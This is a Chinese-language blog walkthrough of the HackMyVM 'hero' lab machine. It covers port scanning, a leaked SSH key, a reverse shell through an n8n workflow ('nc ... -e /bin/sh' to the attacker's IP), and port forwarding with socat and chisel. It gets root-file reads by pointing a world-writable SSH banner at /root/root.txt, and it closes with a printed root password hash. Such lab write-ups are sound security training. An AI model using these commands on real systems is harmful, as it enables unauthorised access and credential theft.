---
{"dg-publish":true,"title":"hackmyvm_hero","tags":["blog"],"dg-path":"安全/靶机/hackmyvm_hero.md","permalink":"/安全/靶机/hackmyvm_hero/","dgPassFrontmatter":true}
---

# 主机发现

```sh
┌──(root㉿kali)-[~/.ssh]
└─# nmap -sT -min-rate 5000 -p- 192.168.124.29
Starting Nmap 7.95 ( https://nmap.org ) at 2025-02-07 09:13 EST
Nmap scan report for 192.168.124.29 (192.168.124.29)
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT     STATE SERVICE
80/tcp   open  http
5678/tcp open  rrac
MAC Address: 08:00:27:1B:51:C7 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 23.73 seconds

```



# web渗透

80端口目录扫描啥也没扫出来

```sh
┌──(root㉿kali)-[~]
└─# curl 192.168.124.29
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwgAAAJAczctSHM3L
UgAAAAtzc2gtZWQyNTUxOQAAACComGN9cfmTL7x35hlgu2RO+QW3WwCmBLSF++ZOgi9uwg
AAAEAnYotUqBFoopjEVz9Sa9viQ8AhNVTx0K19TC7YQyfwAqiYY31x+ZMvvHfmGWC7ZE75
BbdbAKYEtIX75k6CL27CAAAACnNoYXdhQGhlcm8BAgM=
-----END OPENSSH PRIVATE KEY-----

```

首页信息像是一个私钥，但是主机也没开ssh

```sh
┌──(root㉿kali)-[~/workspace/pentest/hero]
└─# ssh-keygen -y -f id2
ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIKiYY31x+ZMvvHfmGWC7ZE75BbdbAKYEtIX75k6CL27C shawa@hero
```



看一下这个5678端口
运行的是一个N8N 的服务
https://github.com/n8n-io/n8n

---
在 Overview 里面找到 Credentials ，新增 shawa 账号和刚才的 key 。  
IP 注意不能是 localhost 或者 127.0.0.1 ，因为是 Docker 里。
提示你 Connection tested successfully 就行了。
在 Workflow 里面创建一个 Workflow ，弄个手动的 Trigger。 第二个节点选 SSH 
就可以 Test 命令了。

---

这里是大佬给的思路

我在配置凭证的时候一直不成功，然后重装了一遍靶机就好了
![Pasted image 20250208221653.png](/img/user/picture/Pasted%20image%2020250208221653.png)


![Pasted image 20250208092934.png](/img/user/picture/Pasted%20image%2020250208092934.png)
这里就可以尝试进行反弹shell

![Pasted image 20250208093103.png](/img/user/picture/Pasted%20image%2020250208093103.png)
```
 nc 192.168.124.27 8080 -e /bin/sh
```

![Pasted image 20250208093248.png](/img/user/picture/Pasted%20image%2020250208093248.png)

这里尝试取获得一个稳定的shell一直失败


```sh
netstat -lntup
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::5678                 :::*                    LISTEN      -
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
...
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP qlen 1000
...
3: docker0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:f5:e3:e5:c6 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
    inet6 fe80::42:f5ff:fee3:e5c6/64 scope link
       valid_lft forever preferred_lft forever

```

注意到第三行是172.17.0.1:22，监听在特定IPv4地址的22端口。22是SSH端口，但这里的本地地址是172.17.0.1，这通常是Docker或其他容器网络的网关地址。可能主机上的SSH服务只绑定在这个内部地址，而不是0.0.0.0，这样外部网络可能无法通过SSH连接

所以我们尝试将这个转发出去
这里分享一下工具链接
https://github.com/ernw/static-toolbox/releases/tag/socat-v1.7.4.4

```sh
./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &

netstat -lntup
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:5678            0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:2222            0.0.0.0:*               LISTEN      2949/socat
tcp        0      0 172.17.0.1:22           0.0.0.0:*               LISTEN      -
tcp        0      0 :::80                   :::*                    LISTEN      -
tcp        0      0 :::5678                 :::*                    LISTEN      -

```

用私钥连接就可以了

```sh
ssh -i id2 -p 2222 shawa@192.168.124.30

...

hero:~$ ls
user.txt
hero:~$ cat user.txt
HMVOHIMNOTREAL
```




# 提权

sudo和suid都没什么东西

发现在ssh配置文件中设置了banner
```txt
# no default banner path
Banner /opt/banner.txt
```

```sh
hero:~$ cat /opt/banner.txt
shawa was here.
hero:~$ ls -l /opt/banner.txt
-rw-rw-rw-    1 root     root            16 Feb  6 10:09 /opt/banner.txt
```

```sh
hero:~$ ls -l /
total 65
...
drw-rw-rwx    3 root     root          4096 Feb  6 10:14 opt
...
```
发现opt目录我们是有操作权限的
所以我们就可以实现任意文件读取


```sh
hero:/opt$ rm banner.txt
hero:/opt$ ls
containerd
hero:/opt$ ln -sv /root/root.txt banner.txt
'banner.txt' -> '/root/root.txt'
hero:/opt$ ls -al
total 12
drw-rw-rwx    3 root     root          4096 Feb  8 02:38 .
drwxr-xr-x   21 root     root          4096 Feb  6 10:03 ..
lrwxrwxrwx    1 shawa    shawa           14 Feb  8 02:38 banner.txt -> /root/root.txt
drwx--x--x    4 root     root          4096 Feb  6 10:14 containerd
hero:/opt$ ssh root@localhost -p 2222
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
HMVNOTINPRODLOL
root@localhost's password:

```
得到flag
```txt
HMVNOTINPRODLOL
```


# 补

如果一开始是使用的Execute Command这个模块进行的反弹shell
那么是不需要配置凭证的，但是获得的shell是在dockers中
```sh
┌──(root㉿kali)-[~]
└─# nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.124.27] from (UNKNOWN) [192.168.124.30] 33421
id
uid=1000(node) gid=1000(node) groups=1000(node)
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host
       valid_lft forever preferred_lft forever
4: eth0@if5: <BROADCAST,MULTICAST,UP,LOWER_UP,M-DOWN> mtu 1500 qdisc noqueue state UP
    link/ether 02:42:ac:11:00:02 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.2/16 brd 172.17.255.255 scope global eth0
       valid_lft forever preferred_lft forever
```

首先把chishel工具上传上去
https://github.com/jpillora/chisel/releases

首先在本机执行：
```sh
┌──(root㉿kali)-[~/sharedir]
└─# ./chisel server -p 2025 --reverse
2025/02/08 05:08:01 server: Reverse tunnelling enabled
2025/02/08 05:08:01 server: Fingerprint g2Y54AZXMGOk5s+SFgpOtrSCfUOQ383VgB0MXoeNlRk=
2025/02/08 05:08:01 server: Listening on http://0.0.0.0:2025

```



在靶机中执行：
```sh
./chisel client 192.168.124.27:2025 R:2222:172.17.0.1:22 &
```

出现这个提示
![Pasted image 20250208181230.png](/img/user/picture/Pasted%20image%2020250208181230.png)

```sh
┌──(root㉿kali)-[~/workspace/pentest/hero]
└─# ssh -i id2 -p 2222 shawa@192.168.124.27
The authenticity of host '[192.168.124.27]:2222 ([192.168.124.27]:2222)' can't be established.
ED25519 key fingerprint is SHA256:EBZrmf2l6+BtffXHAEtSx6Suq5Wf09yzZlVqbQaGOVM.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.124.27]:2222' (ED25519) to the list of known hosts.
//这里会显示banner内容
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <https://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

hero:~$id
uid=1000(shawa) gid=1000(shawa) groups=1000(shawa)

```


```txt
root:$6$WBuW3zyLro0fagui$gq9zWbt3gEpo26gkIjtgjYZqjCJtjJrJO9EHaWkglVZWwWhQiiSNmMGejRn.Q58Z9knsWP59OQqLPgt2NAWd80:20125:0:::::


root:x:0:0:root:/root:/bin/sh
```












